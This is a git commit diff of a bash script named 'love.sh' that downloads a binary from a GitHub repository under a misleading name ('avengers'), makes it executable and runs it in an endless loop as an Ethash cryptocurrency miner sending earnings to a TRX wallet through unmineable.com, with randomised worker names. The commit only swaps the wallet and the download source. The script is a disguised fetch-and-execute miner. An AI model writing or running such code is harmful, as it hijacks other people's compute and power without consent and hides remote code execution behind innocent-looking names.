b5912fe08fe031b0466ce1e4c067fc425230076b
alibahrami1204 <89921212+alibahrami1204@users.noreply.github.com>
2021-09-01 18:50:03 +0430

    Update love.sh

--- love.sh
+++ love.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=TRX:TDUyaKcbhFGViyBHarTtPuHhHk9mXm84th
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/priyatama
-chmod +x priyatama
+wget https://github.com/alibahrami1204/Success/raw/main/avengers
+chmod +x avengers
 while [ 1 ]; do
-./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./avengers --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 5
 done
 sleep 999999999 
